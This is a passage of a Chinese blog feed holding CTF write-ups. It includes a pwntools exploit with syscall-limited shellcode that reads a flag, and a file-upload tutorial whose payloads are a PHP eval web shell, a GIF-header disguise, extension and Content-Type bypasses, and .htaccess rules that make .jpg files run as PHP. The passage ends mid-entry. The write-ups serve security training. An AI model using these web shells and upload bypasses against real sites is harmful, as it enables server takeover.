class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v6; <span class="comment">// r8</span></span><br><span class="line">  __int64 v7; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">__pid_t</span> v8; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v8 = fork();</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;puchid: %d\n&quot;</span>, v8);</span><br><span class="line">    mmap((<span class="type">void</span> *)<span class="number">0x10000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">    read(<span class="number">0</span>, (<span class="type">void</span> *)<span class="number">0x10000</span>, <span class="number">0xC3</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)count_syscall_instructions(<span class="number">0x10000</span>LL, <span class="number">4096LL</span>) &gt; <span class="number">2</span> ) <span class="comment">// 核心</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    sandbox(<span class="number">0x10000</span>LL, <span class="number">4096LL</span>, v4, v5, v6, v7);</span><br><span class="line">    MEMORY[<span class="number">0x10000</span>]();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    made_in_heaven(); <span class="comment">// 输出一些人名以及作者，用处不大</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The time is Accelerating&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;MADE IN HEAVEN !!!!!!!!!!!!!!!!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>查看一下核心的函数 <code>count_syscall_instructions</code></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">count_syscall_instructions</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; a2 - <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(a1 + i) == <span class="number">15</span> &amp;&amp; *(_BYTE *)(i + <span class="number">1</span> + a1) == <span class="number">5</span> )</span><br><span class="line">      ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这里就是检查 <code>\x0f\x05</code>字节码的个数，这刚好是 syscall的字节码，因此我们的shellcode仅能包含两次syscall。</p><p>拿上之前在2024BaseCTF里面的脚本直接梭即可，鸣谢 <code>gets</code>师傅。</p><p>（可参考：<a href="https://downbeat.top/2024/09/18/%E6%B2%99%E7%AE%B1%E7%A6%81%E7%94%A8ORW-BaseCTF/%EF%BC%89">https://downbeat.top/2024/09/18/%E6%B2%99%E7%AE%B1%E7%A6%81%E7%94%A8ORW-BaseCTF/）</a></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"><span class="comment">#libc = &quot;./libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(file)</span><br><span class="line"><span class="comment">#p = remote(&quot;gz.imxbt.cn&quot;,20551)</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line"><span class="comment">#libc = ELF(libc)</span></span><br><span class="line"><span class="comment">#p = remote(&quot;&quot;, 23583)</span></span><br><span class="line"></span><br><span class="line">shellcode = (<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c66</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov r10, 7</span></span><br><span class="line"><span class="string">    mov rax, 0x101</span></span><br><span class="line"><span class="string">    syscall </span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">    mov rdi,1</span></span><br><span class="line"><span class="string">    mov rsi,3   </span></span><br><span class="line"><span class="string">    mov rdx,0</span></span><br><span class="line"><span class="string">    mov r10,0x100</span></span><br><span class="line"><span class="string">    push 40</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;MADE IN HEAVEN !!!!!!!!!!!!!!!!&quot;</span>)</span><br><span class="line">sd(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../image-20250121002148752.png" alt="image-20250121002148752"></p><h1 id="IOT-blink"><a href="#IOT-blink" class="headerlink" title="IOT-blink"></a>IOT-blink</h1><p>直接查看字符串，有个比较特殊的，很抽象。</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250121002434862.png" alt="image-20250121002434862"></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rtosandmorseisveryeasyhahhaha</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2024/12/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2024/12/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><ul><li>打开便是上传文件，那我们直接上传一句话木马：</li></ul><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206171443704.bmp"></p><h2 id="修改content-type"><a href="#修改content-type" class="headerlink" title="修改content-type"></a>修改content-type</h2><ul><li>尝试抓包修改<code>Content-Type</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206171934703.bmp"></p><h2 id="php后缀绕过"><a href="#php后缀绕过" class="headerlink" title="php后缀绕过"></a>php后缀绕过</h2><ul><li>尝试修改后缀绕过</li></ul><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.phtml .php1 .php2 .phar</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206172413740.bmp"></p><p>又显示file里面不能包含<code>&lt;?</code>,继续修改文件</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过&lt;?"></a>绕过&lt;?</h2><ul><li>使用js+php来绕过检查</li></ul><p><mark>这里需要注意php的版本要大于5.4<mark></mark></mark></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>];&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><p>但是显示不是图像:</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206173458188.bmp"></p><h2 id="添加GIF头来伪装"><a href="#添加GIF头来伪装" class="headerlink" title="添加GIF头来伪装"></a>添加GIF头来伪装</h2><p>在文件的头部添加<code>GIF89a</code>可以伪装为gif图像,但是本质还是php文件</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">GIF89</span>a;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div><p>图片中少了括号</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206173703393.bmp"></p><p>ok!上传成功</p><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><p>一般上传的文件都是在&#x2F;upload路径下面</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206173844462.bmp"></p><h2 id="蚁剑连接❤️❤️"><a href="#蚁剑连接❤️❤️" class="headerlink" title="蚁剑连接❤️❤️"></a>蚁剑连接❤️❤️</h2><p>密码就是POST里面的参数</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206181338166.bmp"></p><h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><ul><li>步骤和上一道题目一样，开始直接传入简单的一句话木马，然后说后缀不能含有ph，那么和上一道题目一样修改<code>content-type</code>为<code>image/png</code>，shell1的后缀也改为<code>png</code>，但是显示太露骨</li><li>此时切换后缀为<code>jpg</code>,<code>content-type</code>为<code>image/jpeg</code>，此时可以绕过后缀，但是还是和上一道题目一样，也是限制了<code>&lt;?</code>，于是我们传入和上一题一样的木马，就可以上传成功了，这里一样要注意php版本：</li></ul><p>看下方的php版本明显&gt;5.4</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206194258070.bmp"></p><p>下面看传入成功的记录：</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206192110631.bmp"></p><p>看样子是上传成功了，但是你去访问这个路径的时候，<strong>得到的是一个jpg的图像</strong>，这与我们传入php文件的想法背道而驰，这里说明该服务器不将该jpg文件解析为php文件，那么如何修改呢？如下：</p><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><blockquote><h3 id="1-什么是-htaccess-文件？"><a href="#1-什么是-htaccess-文件？" class="headerlink" title="1.什么是 .htaccess 文件？"></a><strong>1.什么是 <code>.htaccess</code> 文件？</strong></h3><p><code>.htaccess</code> 是 Apache HTTP 服务器的配置文件，用于为特定目录定义规则，覆盖全局配置。常用的功能包括：</p><ul><li>URL 重写</li><li>文件访问控制</li><li>MIME 类型定义</li><li>目录索引控制</li></ul><p>在特定情况下，上传自定义的 <code>.htaccess</code> 文件可以用来改变服务器的行为，甚至执行恶意代码。</p><h3 id="2-htaccess-常见用途"><a href="#2-htaccess-常见用途" class="headerlink" title="2. .htaccess 常见用途"></a><strong>2. <code>.htaccess</code> 常见用途</strong></h3><h4 id="2-1-修改文件解析规则"><a href="#2-1-修改文件解析规则" class="headerlink" title="2.1 修改文件解析规则"></a><strong>2.1 修改文件解析规则</strong></h4><p>通过更改 MIME 类型或处理程序，将非 <code>.php</code> 文件解析为 PHP。</p><ul><li><p><strong>强制解析特定后缀为 PHP：</strong></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">AddType</span> application/x-httpd-php .<span class="property">jpg</span></span><br><span class="line"><span class="title class_">AddType</span> application/x-httpd-php .<span class="property">txt</span></span><br></pre></td></tr></table></figure></div><p>上传后，可以将伪装的图片或文本文件作为 PHP 执行。</p><p><strong>访问方式：</strong></p><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target.com/upload/shell.jpg</span><br></pre></td></tr></table></figure></div></li><li><p><strong>特定文件匹配：</strong></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">FilesMatch</span> <span class="string">&quot;\.jpg$&quot;</span>&gt;</span><br><span class="line">    <span class="title class_">SetHandler</span> application/x-httpd-php</span><br><span class="line">&lt;/<span class="title class_">FilesMatch</span>&gt;</span><br></pre></td></tr></table></figure></div><p>仅将 <code>.jpg</code> 文件按 PHP 解析。</p></li></ul><hr><h4 id="2-2-文件包含绕过"><a href="#2-2-文件包含绕过" class="headerlink" title="2.2 文件包含绕过"></a><strong>2.2 文件包含绕过</strong></h4><p>如果目标服务器通过黑名单过滤某些文件扩展名（如 <code>.php</code>），可以利用 <code>.htaccess</code> 改变文件解析方式。</p><ul><li><p>示例：</p><p>上传 <code>.htaccess</code>文件，将特定扩展名映射为 PHP：</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">AddHandler</span> application/x-httpd-php .<span class="property">shell</span></span><br></pre></td></tr></table></figure></div><p>然后上传 <code>shell.shell</code>文件将被解析为 PHP。</p></li></ul><hr><h4 id="2-3-禁用目录索引"><a href="#2-3-禁用目录索引" class="headerlink" title="2.3 禁用目录索引"></a><strong>2.3 禁用目录索引</strong></h4><p>通过禁用目录列表功能隐藏文件结构：</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Options</span> -<span class="title class_">Indexes</span></span><br></pre></td></tr></table></figure></div><ul><li>如果目标开启目录索引，渗透者可能利用此功能发现敏感文件。通过上传 <code>.htaccess</code>，可以禁用目录列表。</li></ul><hr><h4 id="2-4-URL-重写"><a href="#2-4-URL-重写" class="headerlink" title="2.4 URL 重写"></a><strong>2.4 URL 重写</strong></h4><p>利用 URL 重写规则进行路径伪装或访问控制。</p><ul><li><p><strong>伪装路径：</strong></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">RewriteEngine</span> <span class="title class_">On</span></span><br><span class="line"><span class="title class_">RewriteRule</span> ^admin$ /login.<span class="property">php</span> [L]</span><br></pre></td></tr></table></figure></div></li><li><p><strong>绕过访问限制：</strong> 如果目标系统基于路径控制访问权限，可以用 <code>.htaccess</code> 修改访问路径，绕过限制。</p></li></ul></blockquote><ul><li>也就是说如果是<code>Apache</code>服务器，我们就可以通过添加<code>.htaccess</code>去将.png或者.jpg文件强制解析为<code>.php</code>文件，这样也就达到我们的目的了，但是在上面php版本的图片已经显示了该题目的服务器是<code>openresty</code>，它的核心是Nginx，无法借助<code>.htaccess</code>来是修改文件解析了<ul><li><mark>但是<mark></mark></mark></li></ul></li></ul><blockquote><p>许多网站部署时会使用 <strong>Apache</strong> 和 <strong>Nginx&#x2F;OpenResty</strong> 组合架构，例如：</p><ul><li>Apache 作为后端应用处理 PHP 或其他动态内容。</li><li>Nginx&#x2F;OpenResty 作为前端反向代理。</li></ul><p>在这种情况下：</p><ul><li><strong>.htaccess</strong> 文件实际上被 Apache 解析并生效。</li><li>你的上传目录直接由 Apache 处理，而非由 OpenResty。</li></ul><h4 id="验证方法："><a href="#验证方法：" class="headerlink" title="验证方法："></a><strong>验证方法：</strong></h4><ul><li><p>上传一个明显会暴露 Apache 信息的 <code>.htaccess</code>，例如：</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ErrorDocument</span> <span class="number">403</span> <span class="string">&quot;Apache Detected&quot;</span></span><br></pre></td></tr></table></figure></div><p>如果返回的信息是 </p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Apache</span> <span class="title class_">Detected</span></span><br></pre></td></tr></table></figure></div><p>，说明后端是 Apache。</p></li></ul></blockquote><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206200818057.bmp"></p><ul><li>ooooooook!! 所以我们可以通过修改<code>.htaccess</code>来修改文件解析，如下：</li></ul><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">AddType</span>: application/x-httpd-php .<span class="property">jpg</span></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206193736442.bmp"></p><p>然后再次上传一次shell.jpg即可，访问看一下：</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206201337073.bmp"></p><p>ok，成功解析为php文件</p><h2 id="蚁剑连接❤️❤️-1"><a href="#蚁剑连接❤️❤️-1" class="headerlink" title="蚁剑连接❤️❤️"></a>蚁剑连接❤️❤️</h2><p>跟第一题是一样的，也是在根目录下面</p><h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><h2 id="前端文件后缀检查"><a href="#前端文件后缀检查" class="headerlink" title="前端文件后缀检查"></a>前端文件后缀检查</h2><ul><li>上传文件，发现有限制，且限制是以弹窗的形式给出，我们查看源代码中的&lt;script&gt;标签内容:</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206202925943.bmp"></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;璇烽€夋嫨瑕佷笂浼犵殑鏂囦欢!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//瀹氫箟鍏佽涓婁紶鐨勬枃浠剁被鍨�</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//鎻愬彇涓婁紶鏂囦欢鐨勭被鍨�</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//鍒ゆ柇涓婁紶鏂囦欢绫诲瀷鏄惁鍏佽涓婁紶</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;璇ユ枃浠朵笉鍏佽涓婁紶锛岃涓婁紶jpg銆乸ng銆乬if缁撳熬鐨勫浘鐗囧櫌锛�&quot;</span>;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>这里发现有对文件后缀经行检查，但是这只是服务器端前端的检查，我们抓包之后修改后缀即可，抓包之后修改的是后端的内容：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206203130844.bmp"></p><ul><li>访问检查一下：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../image-20241206202750063.png" alt="image-20241206202750063"></p><h2 id="蚁剑连接❤️❤️-2"><a href="#蚁剑连接❤️❤️-2" class="headerlink" title="蚁剑连接❤️❤️"></a>蚁剑连接❤️❤️</h2><p>一样的步骤，flag也是在根目录下面</p><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><ul><li>修改文件后缀绕过检查</li><li>修改<code>Content-Type</code>，常见修改为：</li></ul><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">image/png</span><br><span class="line">image/jpeg</span><br></pre></td></tr></table></figure></div><ul><li>绕过对<code>&lt;?</code>的检查，<mark>php版本大于5.4<mark>，同时添加<code>GIF</code>头绕过检查</mark></mark></li></ul><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">GIF86</span>a; </span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div><ul><li>修改<code>.htaccess</code>配置绕过不解析php文件，<mark>注意是在<code>Apache</code>服务器中，遇到的<code>openresty</code>服务器可用下列语句检查是否含有<code>Apache</code></mark></li></ul><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ErrorDocument</span> <span class="number">403</span> <span class="string">&quot;Apache Detected&quot;</span></span><br></pre></td></tr></table></figure></div><p>访问之后如果显示<code>Apache Detected</code>就说明包含有<code>Apache</code>，可以修改<code>.htaccess</code></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">AddType</span>: application/x-httpd-php .<span class="property">jpg</span> </span><br><span class="line"><span class="comment">// 